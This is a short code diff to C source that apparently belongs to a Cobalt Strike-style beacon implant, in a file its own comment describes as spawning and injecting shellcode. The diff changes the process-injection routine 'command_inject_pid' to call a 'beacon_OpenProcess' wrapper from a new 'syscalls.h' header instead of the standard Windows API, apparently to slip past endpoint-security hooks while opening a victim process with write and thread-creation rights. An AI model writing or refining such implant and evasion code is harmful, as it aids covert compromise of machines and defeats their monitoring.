@@ -2,6 +2,7 @@
 * Functions related to spawning and injecting shellcode. Better to group these into one spot.
 */
 #include <stdlib.h>
+#include "syscalls.h"
 #include <stdio.h>
 #include <windows.h>
 #include "beacon.h"
@@ -32,7 +33,7 @@ void command_inject_pid(char * buffer, int length, BOOL x86) {
 	offset = data_int(&parser);
 
 	/* open the process for some oh so subtle manipulation */
-	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
+	hProcess = beacon_OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
 	if (hProcess == NULL) {
 		post_error_dd(0x21, pid, GetLastError());
 		return;
